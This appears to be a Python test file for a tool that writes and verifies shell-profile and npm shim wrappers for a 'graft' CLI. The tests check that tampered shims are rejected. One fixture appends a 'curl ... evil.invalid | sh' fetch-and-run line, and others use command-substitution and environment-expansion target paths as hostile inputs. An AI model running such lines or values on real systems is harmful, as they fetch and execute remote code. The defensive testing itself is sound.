            scope = {"shell_profiles": [{"path": str(profile), "shell": "bash", "bin": str(bin_dir)}]}
            entry = hosts.verify_hosts(scope, package_root=_package(base))["shell_profiles"][0]
            self.assertEqual(entry["legacy"]["status"], "present", entry)
            self.assertEqual(profile.read_bytes(), before)

    @unittest.skipUnless(os.name == "nt" and shutil.which("bash"), "native Git Bash required")
    def test_git_bash_binds_exe_not_same_named_powershell_wrapper(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            bin_dir = base / "bin with space"
            bin_dir.mkdir()
            executable = _write_graft(bin_dir)
            (bin_dir / "graft.ps1").write_text("Write-Output 'unrelated wrapper'\n", encoding="utf-8")
            profile = base / ".bashrc"
            scope = {"shell_profiles": [{"path": str(profile), "shell": "bash", "bin": str(bin_dir)}]}
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            self.assertEqual(resource["details"]["command_identity"]["path"], str(executable))
            _write(profile, hosts.render_resource(resource))
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)["shell_profiles"][0]
            self.assertEqual(entry["status"], "pass", entry)
            executable.write_bytes(b"changed executable, unchanged ps1")
            with self.assertRaises(ContractError) as changed:
                hosts.render_resource(resource)
            self.assertEqual(changed.exception.code, "state-conflict")

    @unittest.skipUnless(os.name == "nt", "native Windows boundary only")
    def test_probe_spawn_env_carries_system_root_and_comspec(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime, package = _runtime(base), _package(base)
            skills = _skills_root(base, ["alpha"])
            project = base / "project"
            project.mkdir()
            host = _codex_host(
                base, runtime, skills_roots=[skills], project_roots=[project]
            )
            scope = {"hosts": [host], "skills_roots": [str(skills)]}
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            _write(Path(host["config"]), hosts.render_resource(resource))
            rig = _ProbeRig(self, ["alpha"]).install()
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)["hosts"][0]
            # The real ACL path proves the fixture private, so the native
            # probe completes end to end instead of failing privacy-unproven.
            self.assertEqual(entry["status"], "pass", entry)
            self.assertTrue(rig.spawns)
            for _argv, environment, _cwd in rig.spawns:
                self.assertEqual(
                    environment["SystemRoot"],
                    os.environ.get("SystemRoot", r"C:\Windows"),
                )
                self.assertEqual(
                    environment["COMSPEC"],
                    os.environ.get("COMSPEC", r"C:\Windows\System32\cmd.exe"),
                )
            self.assertNotIn(SECRET, json.dumps(entry))


class NativePowerShellResolutionTests(unittest.TestCase):
    @unittest.skipUnless(
        os.name == "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
        "native Windows PowerShell unavailable",
    )
    def test_selected_powershell_profile_resolves_real_graft_script(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            bin_dir = base / "bin with space"
            bin_dir.mkdir()
            (bin_dir / "graft.ps1").write_text("exit 0\n", encoding="utf-8")
            profile = base / "profile.ps1"
            scope = {
                "shell_profiles": [
                    {"path": str(profile), "shell": "powershell", "bin": str(bin_dir)}
                ]
            }
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            _write(profile, hosts.render_resource(resource))
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)["shell_profiles"][0]
            self.assertEqual(entry["status"], "pass")
            self.assertEqual(
                entry["host"]["checks"]["command_resolution"]["evidence_scope"],
                "isolated-shell/selected-profile",
            )



# ---------------------------------------------------------------------------
# R01: UTF-16 PowerShell profiles keep BOM/encoding or fail closed pre-write
# ---------------------------------------------------------------------------


def _utf16le(text: str) -> bytes:
    return b"\xff\xfe" + text.encode("utf-16-le")


def _utf16be(text: str) -> bytes:
    return b"\xfe\xff" + text.encode("utf-16-be")


class Utf16PowerShellProfileTests(unittest.TestCase):
    """UTF-16 profiles fail closed before any write; the original is untouched."""

    def _scope(self, profile: Path, bin_dir: Path, decision: str = "replace") -> dict:
        return {
            "shell_profiles": [
                {"path": str(profile), "shell": "powershell", "bin": str(bin_dir)}
            ],
            "decisions": {str(profile): decision},
        }

    def _assert_refused_untouched(
        self, base: Path, profile: Path, bin_dir: Path, original: bytes
    ) -> None:
        package = _package(base)
        resources = hosts.build_host_resources(
            self._scope(profile, bin_dir), package_root=package
        )
        self.assertEqual(resources[0]["decision"], "blocked")
        self.assertEqual(resources[0]["details"]["error_code"], "invalid-config")
        self.assertEqual(profile.read_bytes(), original)
        # Rendering is fail-closed too: never a partial or transcoded write.
        with self.assertRaises(ContractError) as caught:
            hosts.render_resource(resources[0])
        self.assertEqual(caught.exception.code, "invalid-config")
        self.assertEqual(profile.read_bytes(), original)

    def test_utf16le_profile_is_refused_before_any_write(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            profile = base / "profile.ps1"
            bin_dir = base / "bin"
            original = _utf16le("Write-Output 'existing'\r\n$env:FOO = 'bar'\r\n")
            _write(profile, original)
            self._assert_refused_untouched(base, profile, bin_dir, original)

    def test_utf16be_profile_is_refused_before_any_write(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            profile = base / "profile.ps1"
            bin_dir = base / "bin"
            original = _utf16be("# existing\r\n")
            _write(profile, original)
            self._assert_refused_untouched(base, profile, bin_dir, original)

    def test_utf16_profile_with_managed_block_is_refused_untouched(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            profile = base / "profile.ps1"
            bin_dir = base / "bin"
            original = _utf16le(
                "# sbtd-workflow-onboard:path:start\r\n"
                "$env:PATH = 'C:\\bin' + [IO.Path]::PathSeparator + $env:PATH\r\n"
                "# sbtd-workflow-onboard:path:end\r\n"
            )
            _write(profile, original)
            self._assert_refused_untouched(base, profile, bin_dir, original)

    def test_malformed_utf16_profile_is_refused_before_write(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            profile = base / "profile.ps1"
            bin_dir = base / "bin"
            broken = b"\xff\xfe" + b"A\x00B"  # odd byte count: undecodable UTF-16
            _write(profile, broken)
            self._assert_refused_untouched(base, profile, bin_dir, broken)

    def test_utf8_bom_profile_keeps_existing_byte_pipeline(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            profile = base / "profile.ps1"
            bin_dir = base / "bin"
            original = b"\xef\xbb\xbf# utf8 bom comment\n"
            _write(profile, original)
            resources = hosts.build_host_resources(
                self._scope(profile, bin_dir), package_root=_package(base)
            )
            self.assertEqual(resources[0]["decision"], "replace")
            rendered = hosts.render_resource(resources[0])
            self.assertTrue(rendered.startswith(original))
            self.assertIn(b"# sbtd-workflow-onboard:path:start\n", rendered)




# ---------------------------------------------------------------------------
# R04: Codex MCP target is canonically config_home/config.toml
# ---------------------------------------------------------------------------


class CodexCanonicalConfigTests(unittest.TestCase):
    def test_non_canonical_codex_config_is_blocked_before_write(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _codex_host(base, runtime)
            host["config"] = str(base / "account" / ".codex" / "custom.toml")
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=_package(base)
            )
            self.assertEqual(resources[0]["decision"], "blocked")
            self.assertEqual(resources[0]["details"]["error_code"], "scope-conflict")

    def test_aligned_content_in_non_canonical_file_is_never_alignment(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            canonical = _codex_host(base, runtime)
            rendered = hosts.render_resource(
                hosts.build_host_resources({"hosts": [canonical]}, package_root=package)[0]
            )
            host = _codex_host(base, runtime, host_id="codex-custom")
            host["config"] = str(base / "account" / ".codex" / "custom.toml")
            _write(Path(host["config"]), rendered)
            resources = hosts.build_host_resources({"hosts": [host]}, package_root=package)
            self.assertEqual(resources[0]["decision"], "blocked")
            self.assertEqual(resources[0]["details"]["error_code"], "scope-conflict")

    def test_render_rejects_non_canonical_codex_config(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _codex_host(base, runtime)
            host["config"] = str(base / "account" / ".codex" / "custom.toml")
            resource = hosts.build_host_resources(
                {"hosts": [host]}, package_root=_package(base)
            )[0]
            with self.assertRaises(ContractError) as caught:
                hosts.render_resource(resource)
            self.assertEqual(caught.exception.code, "scope-conflict")


# ---------------------------------------------------------------------------
# R06: real npm cmd-shim wrappers must provably bind the selected node/cli
# ---------------------------------------------------------------------------

# Exact npm cmd-shim 9.0.2 generator output (bundled with npm 12.1.0 through
# bin-links; generator source read at npm/node_modules/bin-links/node_modules/
# cmd-shim/lib/index.js) for a node-shebang target at NPM_SHIM_REL relative to
# the shim's own bin directory.
NPM_SHIM_REL = "../node_modules/@nanonets/graft/dist/cli.js"
NPM_SHIM_SH = (
    "#!/bin/sh\n"
    'basedir=$(dirname "$(echo "$0" | sed -e \'s,\\\\,/,g\')")\n'
    'basedir_win="$basedir"\n'
    "\n"
    "case `uname -a` in\n"
    "  *CYGWIN*|*MINGW*|*MSYS*)\n"
    "    if command -v cygpath > /dev/null 2>&1; then\n"
    "      basedir_win=`cygpath -w \"$basedir\"`\n"
    "    fi\n"
    "  ;;\n"
    "  *WSL2*)\n"
    "    if command -v wslpath > /dev/null 2>&1; then\n"
    "      basedir_win=\"$(wslpath -w \"$basedir\" 2> /dev/null)\"\n"
    '      if [ $? -ne 0 ] || [ -z "$basedir_win" ]; then\n'
    '        echo "Error: wslpath failed to convert path. WSL environment may be misconfigured." >&2\n'
    "        exit 1\n"
    "      fi\n"
    "    fi\n"
    "  ;;\n"
    "esac\n"
    "\n"
    'PROG_EXE="$basedir/node.exe"\n'
    'if ! [ -x "$PROG_EXE" ]; then\n'
    '  PROG_EXE="$basedir/node"\n'
    '  if ! [ -x "$PROG_EXE" ]; then\n'
    "    PROG_EXE=node\n"
    '    if ! [ -x "$PROG_EXE" ]; then\n'
    "      PROG_EXE=node.exe\n"
    "    fi\n"
    "  fi\n"
    "fi\n"
    "\n"
    'exec "$PROG_EXE"  "$basedir_win/' + NPM_SHIM_REL + '" "$@"\n'
)
NPM_SHIM_CMD = "\r\n".join(
    [
        "@ECHO off",
        "GOTO start",
        ":find_dp0",
        "SET dp0=%~dp0",
        "EXIT /b",
        ":start",
        "SETLOCAL",
        "CALL :find_dp0",
        "",
        'IF EXIST "%dp0%\\node.exe" (',
        '  SET "_prog=%dp0%\\node.exe"',
        ") ELSE (",
        '  SET "_prog=node"',
        ")",
        "",
        'endLocal & goto #_undefined_# 2>NUL || title %COMSPEC% & '
        'set PATHEXT=%PATHEXT:;.JS;=;% & "%_prog%"  "%dp0%\\'
        + NPM_SHIM_REL.replace("/", "\\")
        + '" %*',
    ]
) + "\r\n"
NPM_SHIM_PS1 = (
    "#!/usr/bin/env pwsh\n"
    "$basedir=Split-Path $MyInvocation.MyCommand.Definition -Parent\n"
    "\n"
    '$exe=""\n'
    'if ($PSVersionTable.PSVersion -lt "6.0" -or $IsWindows) {\n'
    "  # Fix case when both the Windows and Linux builds of Node\n"
    "  # are installed in the same directory\n"
    '  $exe=".exe"\n'
    "}\n"
    "$ret=0\n"
    'if (Test-Path "$basedir/node$exe") {\n'
    "  # Support pipeline input\n"
    "  if ($MyInvocation.ExpectingInput) {\n"
    '    $input | & "$basedir/node$exe"  "$basedir/' + NPM_SHIM_REL + '" $args\n'
    "  } else {\n"
    '    & "$basedir/node$exe"  "$basedir/' + NPM_SHIM_REL + '" $args\n'
    "  }\n"
    "  $ret=$LASTEXITCODE\n"
    "} else {\n"
    "  # Support pipeline input\n"
    "  if ($MyInvocation.ExpectingInput) {\n"
    '    $input | & "node$exe"  "$basedir/' + NPM_SHIM_REL + '" $args\n'
    "  } else {\n"
    '    & "node$exe"  "$basedir/' + NPM_SHIM_REL + '" $args\n'
    "  }\n"
    "  $ret=$LASTEXITCODE\n"
    "}\n"
    "exit $ret\n"
)


def _npm_package_cli(base: Path, package: str = "@nanonets/graft") -> Path:
    cli = base / "node_modules" / Path(package) / "dist" / "cli.js"
    _write(cli, b"#!/usr/bin/env node\n// pinned cli fixture\n")
    return cli


def _npm_shims(bin_dir: Path, rel: str = NPM_SHIM_REL) -> None:
    """The three files cmd-shim 9.0.2 writes for one bin entry."""
    bin_dir.mkdir(parents=True, exist_ok=True)
    shim = bin_dir / "graft"
    shim.write_bytes(NPM_SHIM_SH.replace(NPM_SHIM_REL, rel).encode("utf-8"))
    shim.chmod(0o755)
    (bin_dir / "graft.cmd").write_bytes(
        NPM_SHIM_CMD.replace(
            NPM_SHIM_REL.replace("/", "\\"), rel.replace("/", "\\")
        ).encode("utf-8")
    )
    (bin_dir / "graft.ps1").write_bytes(
        NPM_SHIM_PS1.replace(NPM_SHIM_REL, rel).encode("utf-8")
    )


class NpmShimBindingTests(unittest.TestCase):
    def _profile_scope(self, base: Path, runtime: dict, bin_dir: Path):
        host = _codex_host(base, runtime)
        profile = base / "selected-profile"
        scope = {
            "hosts": [host],
            "shell_profiles": [
                {"path": str(profile), "shell": "bash", "bin": str(bin_dir)}
            ],
        }
        return scope, profile

    @unittest.skipUnless(shutil.which("bash"), "bash required")
    def test_literal_apostrophe_and_percent_in_npm_target_resolve(self):
        """U29: quoted shim targets keep literal punctuation, not shell expansion."""
        for name in ("O'Brien", "percent%name"):
            with self.subTest(name=name), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                package, runtime = _package(base), _runtime(base)
                cli = base / name / "dist/cli.js"
                _write(cli, b"// selected cli\n")
                runtime["cli"] = str(cli)
                bin_dir = base / "bin"
                _npm_shims(bin_dir, f"../{name}/dist/cli.js")
                scope, profile = self._profile_scope(base, runtime, bin_dir)
                resource = next(
                    row for row in hosts.build_host_resources(scope, package_root=package)
                    if row["kind"] == "shell"
                )
                _write(profile, hosts.render_resource(resource))
                entry = hosts.verify_hosts(scope, package_root=package, probe=True)["shell_profiles"][0]
                self.assertEqual(entry["host"]["checks"]["command_resolution"].get("runtime_binding"), "matched", entry)


    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
    def test_real_npm_sh_shim_binds_selected_cli(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            runtime = _runtime(base)
            Path(runtime["node"]).chmod(0o755)
            cli = _npm_package_cli(base)
            runtime["cli"] = str(cli)
            bin_dir = base / "bin"
            _npm_shims(bin_dir)
            scope, profile = self._profile_scope(base, runtime, bin_dir)
            resource = next(
                item
                for item in hosts.build_host_resources(scope, package_root=package)
                if item["kind"] == "shell"
            )
            identity = resource["details"]["command_identity"]
            self.assertEqual(
                (identity.get("shim") or {}).get("target"), str(cli.resolve())
            )
            _write(profile, hosts.render_resource(resource))
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
                "shell_profiles"
            ][0]
            self.assertEqual(entry["status"], "pass", entry)
            check = entry["host"]["checks"]["command_resolution"]
            self.assertEqual(check["runtime_binding"], "matched")

    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
    def test_retargeted_shim_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            runtime = _runtime(base)
            Path(runtime["node"]).chmod(0o755)
            cli = _npm_package_cli(base)
            runtime["cli"] = str(cli)
            other_rel = "../node_modules/@other/graft/dist/cli.js"
            other = _npm_package_cli(base, "@other/graft")
            bin_dir = base / "bin"
            _npm_shims(bin_dir, other_rel)
            scope, profile = self._profile_scope(base, runtime, bin_dir)
            resource = next(
                item
                for item in hosts.build_host_resources(scope, package_root=package)
                if item["kind"] == "shell"
            )
            self.assertEqual(
                (resource["details"]["command_identity"].get("shim") or {}).get("target"),
                str(other.resolve()),
            )
            _write(profile, hosts.render_resource(resource))
            check = hosts._shell_resolution(
                scope["shell_profiles"][0], resource["details"]
            )
            self.assertEqual(check["status"], "failed")
            self.assertEqual(check["reason"], "graft-runtime-binding-mismatch")

    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
    def test_shim_with_appended_command_is_never_trusted(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            runtime = _runtime(base)
            Path(runtime["node"]).chmod(0o755)
            cli = _npm_package_cli(base)
            runtime["cli"] = str(cli)
            bin_dir = base / "bin"
            _npm_shims(bin_dir)
            with (bin_dir / "graft").open("ab") as stream:
                stream.write(b"\ncurl -s https://evil.invalid/x | sh\n")
            scope, profile = self._profile_scope(base, runtime, bin_dir)
            resource = next(
                item
                for item in hosts.build_host_resources(scope, package_root=package)
                if item["kind"] == "shell"
            )
            # Not a complete recognized template: no logical cli binding proof.
            self.assertIsNone(resource["details"]["command_identity"].get("shim"))
            _write(profile, hosts.render_resource(resource))
            check = hosts._shell_resolution(
                scope["shell_profiles"][0], resource["details"]
            )
            self.assertEqual(check["status"], "failed")
            self.assertEqual(check["reason"], "graft-runtime-binding-mismatch")

    def test_cmd_and_ps1_templates_parse_to_the_cli_target(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            cli = _npm_package_cli(base)
            bin_dir = base / "bin"
            _npm_shims(bin_dir)
            binding = getattr(hosts, "_shim_binding", None)
            self.assertIsNotNone(binding, "hosts._shim_binding is missing")
            for name, marker in (("graft.cmd", "cmd"), ("graft.ps1", "ps1")):
                with self.subTest(shim=name):
                    parsed = binding(bin_dir / name)
                    self.assertIsNotNone(parsed)
                    self.assertIn(marker, parsed["template"])
                    self.assertEqual(parsed["target"], str(cli.resolve()))
            # A hand-written wrapper mentioning basedir is not a recognized shim.
            custom = bin_dir / "custom"
            custom.write_bytes(
                b"#!/bin/sh\nbasedir=$(dirname \"$0\")\nexec node \"$basedir/x.js\"\n"
            )
            self.assertIsNone(binding(custom))

    def _crafted_shim(self, bin_dir: Path, name: str, template: str, rel: str) -> Path:
        bin_dir.mkdir(exist_ok=True)
        target = bin_dir / name
        token = NPM_SHIM_REL.replace("/", "\\") if name.endswith(".cmd") else NPM_SHIM_REL
        target.write_bytes(template.replace(token, rel).encode("utf-8"))
        return target

    def test_absolute_or_interpolated_shim_targets_are_unprovable(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            bin_dir = base / "bin"
            binding = hosts._shim_binding
            # The proof path math must match the shell's own concatenation:
            # absolute, drive-relative or expansion-bearing captures invoke a
            # different file than Path.parent / rel, so they are not bindings.
            rejected = (
                ("graft", NPM_SHIM_SH, "/etc/evil/cli.js"),
                ("graft", NPM_SHIM_SH, "$HOME/evil/cli.js"),
                ("graft", NPM_SHIM_SH, "`id`/cli.js"),
                ("graft", NPM_SHIM_SH, "C:evil/cli.js"),
                # cmd-shim normalizes sh/ps1 target backslashes to "/", so a
                # backslash capture is an unknown wrapper whose double-quoted
                # shell reading diverges from the proof path math.
                ("graft", NPM_SHIM_SH, "..\\node_modules\\x\\dist\\cli.js"),
                ("graft", NPM_SHIM_SH, "pkg\\\\dist\\cli.js"),
                ("graft.ps1", NPM_SHIM_PS1, "..\\node_modules\\x\\dist\\cli.js"),
                # cmd.exe delayed expansion substitutes !VAR! even inside
                # quotes, so it is refused exactly like %VAR%.
                ("graft.cmd", NPM_SHIM_CMD, "!TOOLS!\\evil\\cli.js"),
                # NUL/control bytes must never reach path resolution (it
                # raises outside the contract): not a provable binding.
                ("graft", NPM_SHIM_SH, "pkg\x00dist/cli.js"),
                ("graft.cmd", NPM_SHIM_CMD, "pkg\tdist\\cli.js"),
                ("graft.cmd", NPM_SHIM_CMD, "%APPDATA%\\evil\\cli.js"),
                ("graft.cmd", NPM_SHIM_CMD, "D:\\pkg\\cli.js"),
                ("graft.cmd", NPM_SHIM_CMD, "\\pkg\\cli.js"),
                ("graft.ps1", NPM_SHIM_PS1, "$HOME/evil/cli.js"),
                ("graft.ps1", NPM_SHIM_PS1, "/etc/evil/cli.js"),
            )
            for name, template, rel in rejected:
                with self.subTest(shim=name, rel=rel):
                    target = self._crafted_shim(bin_dir, name, template, rel)
                    self.assertIsNone(binding(target))
                    target.unlink()
            accepted = (
                ("graft", NPM_SHIM_SH, NPM_SHIM_REL),
                ("graft.cmd", NPM_SHIM_CMD, "..\\node_modules\\pkg with space\\dist\\cli.js"),
                ("graft.ps1", NPM_SHIM_PS1, "../node_modules/päkete/dist/cli.js"),
            )
            for name, template, rel in accepted:
                with self.subTest(shim=name, rel=rel):
                    target = self._crafted_shim(bin_dir, name, template, rel)
                    self.assertIsNotNone(binding(target))
                    target.unlink()

    def test_oversized_wrapper_is_never_read(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            bin_dir = base / "bin"
            bin_dir.mkdir()
            big = bin_dir / "graft"
            big.write_bytes(NPM_SHIM_SH.encode("utf-8") + b"#" * (128 * 1024))
            # The 64KiB bound is enforced from file metadata before any
            # allocation: the safe file open is never invoked.
            with mock.patch.object(
                hosts,
                "open_regular_file",
                side_effect=AssertionError("unbounded read"),
            ):
                self.assertIsNone(hosts._shim_binding(big))

    def test_growth_past_bound_is_rejected_with_bounded_read(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            bin_dir = base / "bin"
            bin_dir.mkdir()
            wrapper = bin_dir / "graft"
            content = NPM_SHIM_SH.encode("utf-8")
            # Exactly at the bound: lstat passes, then the wrapper "grows"
            # mid-read. The single safe-handle read never requests more than
            # MAX+1 bytes and the oversized content is rejected.
            wrapper.write_bytes(
                content + b"#" * (hosts._NPM_SHIM_MAX_BYTES - len(content))
            )
            requested: list[int] = []
            real_open = hosts.open_regular_file

            @contextlib.contextmanager
            def growing(path, label):
                with real_open(path, label) as handle:
                    class _Grown:
                        def read(self, size: int = -1) -> bytes:
                            requested.append(size)
                            return handle.read(size) + b"#"

                    yield _Grown()

            with mock.patch.object(hosts, "open_regular_file", growing):
                self.assertIsNone(hosts._shim_binding(wrapper))
            self.assertEqual(requested, [hosts._NPM_SHIM_MAX_BYTES + 1])

    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
    def test_profile_returning_before_block_never_false_passes(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            runtime = _runtime(base)
            cli = _npm_package_cli(base)
            runtime["cli"] = str(cli)
            bin_dir = base / "bin"
            _npm_shims(bin_dir)
            # The selected runtime node lives in the same bin as graft, so a
            # probe that seeds PATH from runtime directories can resolve
            # graft even when the profile never exposes bin.
            node = bin_dir / "node"
            node.write_bytes(b"#!/bin/sh\nexit 0\n")
            node.chmod(0o755)
            runtime["node"] = str(node)
            scope, profile = self._profile_scope(base, runtime, bin_dir)
            resource = next(
                item
                for item in hosts.build_host_resources(scope, package_root=package)
                if item["kind"] == "shell"
            )
            # A valid profile that returns BEFORE the managed block; only a
            # seeded probe PATH could still resolve graft (false pass).
            _write(profile, b"return 0\n" + hosts.render_resource(resource))
            check = hosts._shell_resolution(
                scope["shell_profiles"][0], resource["details"]
            )
            self.assertEqual(check["status"], "failed")
            self.assertEqual(check["reason"], "graft-not-resolved")


class NativeWindowsShimBindingTests(unittest.TestCase):
    """Real npm cmd-shim wrappers on native Windows (Git Bash / PowerShell)."""

    def test_legacy_powershell_cannot_prove_utf8_unicode_shim(self):
        """U34: command resolution alone does not prove legacy script decoding."""
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package, runtime = _package(base), _runtime(base)
            cli = base / "包/dist/cli.js"
            _write(cli, b"")
            runtime["cli"] = str(cli)
            bin_dir = base / "bin"
            _npm_shims(bin_dir, "../包/dist/cli.js")
            # POSIX fixture uses the selected extensionless command with PS1 bytes.
            if os.name != "nt":
                (bin_dir / "graft").write_bytes((bin_dir / "graft.ps1").read_bytes())
            scope, profile = self._scope(base, runtime, bin_dir, "powershell")
            resource = next(row for row in hosts.build_host_resources(scope, package_root=package)
                            if row["kind"] == "shell")
            _write(profile, hosts.render_resource(resource))
            selected = resource["details"]["command_identity"]["path"]
            real_run = subprocess.run
            for engine, expected in (("5:1252", "failed"), ("7:65001", "verified"), ("5:65001", "verified")):
                wire = f"SBTD_PS_ENCODING={engine}\nSBTD_RESOLVED_GRAFT={selected}\n".encode()

                def selected_probe(argv, *args, wire=wire, **kwargs):
                    if argv[0] == "selected-powershell":
                        return subprocess.CompletedProcess(argv, 0, stdout=wire)
                    return real_run(argv, *args, **kwargs)

                with self.subTest(engine=engine), mock.patch.object(hosts, "_which", return_value="selected-powershell"), mock.patch.object(
                    hosts.subprocess, "run", side_effect=selected_probe,
                ):
                    check = hosts._shell_resolution(scope["shell_profiles"][0], resource["details"])
                self.assertEqual(check["status"], expected, check)
                if expected == "failed":
                    self.assertEqual(check["reason"], "graft-shim-encoding-unproven")

    @unittest.skipUnless(os.name == "nt" and shutil.which("powershell"), "Windows PowerShell 5.1 required")
    def test_native_legacy_engine_unicode_shim_is_not_falsely_matched(self):
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package, runtime = _package(base), self._runtime_with_exe_node(base)
            cli = base / "包/dist/cli.js"
            _write(cli, b"")
            runtime["cli"] = str(cli)
            bin_dir = base / "bin"
            _npm_shims(bin_dir, "../包/dist/cli.js")
            scope, profile = self._scope(base, runtime, bin_dir, "powershell")
            resource = next(row for row in hosts.build_host_resources(scope, package_root=package)
                            if row["kind"] == "shell")
            _write(profile, hosts.render_resource(resource))
            executable = shutil.which("powershell")
            encoding = subprocess.run(
                [executable, "-NoProfile", "-Command", "[Text.Encoding]::Default.CodePage"],
                capture_output=True, text=True, check=True, timeout=30,
            )
            with mock.patch.object(hosts, "_which", return_value=executable):
                check = hosts._shell_resolution(scope["shell_profiles"][0], resource["details"])
            self.assertEqual(check["status"], "verified" if encoding.stdout.strip() == "65001" else "failed", check)

    def _scope(self, base: Path, runtime: dict, bin_dir: Path, shell: str = "bash"):
        host = _codex_host(base, runtime)
        profile = base / ("profile.ps1" if shell == "powershell" else ".bashrc")
        return {
            "hosts": [host],
            "shell_profiles": [
                {"path": str(profile), "shell": shell, "bin": str(bin_dir)}
            ],
        }, profile

    def _runtime_with_exe_node(self, base: Path) -> dict:
        runtime = _runtime(base)
        node = Path(runtime["node"]).with_suffix(".exe")
        shutil.copyfile(sys.executable, node)
        runtime["node"] = str(node)
        return runtime

    @unittest.skipUnless(os.name == "nt" and shutil.which("bash"), "native Git Bash required")
    def test_gitbash_binds_real_npm_sh_shim_to_selected_runtime(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            runtime = self._runtime_with_exe_node(base)
            cli = _npm_package_cli(base)
            runtime["cli"] = str(cli)
            bin_dir = base / "bin with space"
            _npm_shims(bin_dir)
            scope, profile = self._scope(base, runtime, bin_dir)
            resource = next(
                item
                for item in hosts.build_host_resources(scope, package_root=package)
                if item["kind"] == "shell"
            )
            self.assertEqual(
                (resource["details"]["command_identity"].get("shim") or {}).get("target"),
                str(cli.resolve()),
            )
            _write(profile, hosts.render_resource(resource))
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
                "shell_profiles"
            ][0]
            self.assertEqual(entry["status"], "pass", entry)

    @unittest.skipUnless(
        os.name == "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
        "native Windows PowerShell unavailable",
    )
    def test_powershell_binds_real_npm_ps1_shim_to_selected_runtime(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            runtime = self._runtime_with_exe_node(base)
            cli = _npm_package_cli(base)
            runtime["cli"] = str(cli)
            bin_dir = base / "bin with space"
            _npm_shims(bin_dir)
            scope, profile = self._scope(base, runtime, bin_dir, "powershell")
            resource = next(
                item
                for item in hosts.build_host_resources(scope, package_root=package)
                if item["kind"] == "shell"
            )
            self.assertEqual(
                (resource["details"]["command_identity"].get("shim") or {}).get("target"),
                str(cli.resolve()),
            )
            _write(profile, hosts.render_resource(resource))
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
                "shell_profiles"
            ][0]
            self.assertEqual(entry["status"], "pass", entry)


# ---------------------------------------------------------------------------
# R07: the actual winning PowerShell command is inspected, never filtered
# ---------------------------------------------------------------------------


class NativePowerShellShadowTests(unittest.TestCase):
    @unittest.skipUnless(
        os.name == "nt" and (shutil.which("pwsh") or shutil.which("powershell")),
        "native Windows PowerShell unavailable",
    )
    def test_profile_alias_shadowing_graft_fails_the_probe(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            bin_dir = base / "bin"
            bin_dir.mkdir()
            (bin_dir / "graft.ps1").write_text("exit 0\n", encoding="utf-8")
            profile = base / "profile.ps1"
            scope = {
                "shell_profiles": [
                    {"path": str(profile), "shell": "powershell", "bin": str(bin_dir)}
                ],
                "decisions": {str(profile): "replace"},
            }
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            shadowed = (
                hosts.render_resource(resource)
                + b"Set-Alias graft C:\\Windows\\System32\\where.exe\n"
            )
            _write(profile, shadowed)
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
                "shell_profiles"
            ][0]
            check = entry["host"]["checks"]["command_resolution"]
            self.assertEqual(check["status"], "failed")
            self.assertEqual(check["reason"], "graft-resolution-shadowed")

class RealPowerShellWinningCommandTests(unittest.TestCase):
    """Real pwsh winning-command precedence on POSIX (extension-less graft)."""

    def _probe_entry(self, base: Path, extra: bytes):
        package = _package(base)
        # Space, apostrophe and unicode in the selected bin: the real probe
        # exercises the managed block's quoting behaviorally.
        bin_dir = base / "bin with space it's ünïcode"
        bin_dir.mkdir()
        graft = bin_dir / "graft"
